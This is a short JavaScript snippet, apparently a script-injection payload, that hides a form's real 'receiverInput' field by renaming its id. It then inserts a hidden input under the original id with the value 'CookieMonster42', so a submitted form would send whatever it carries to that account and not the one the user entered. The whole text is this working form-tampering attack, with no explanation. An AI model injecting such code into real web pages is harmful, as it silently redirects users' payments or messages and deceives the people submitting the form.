let realReceiverInput = document.getElementById('receiverInput')
let hiddenReceiverInput = document.createElement('input');

hiddenReceiverInput.type = 'hidden'; 
hiddenReceiverInput.id = realReceiverInput.id
realReceiverInput.id += 'real'
hiddenReceiverInput.value = 'CookieMonster42'; 

document.querySelector('.form-container').appendChild(hiddenReceiverInput);


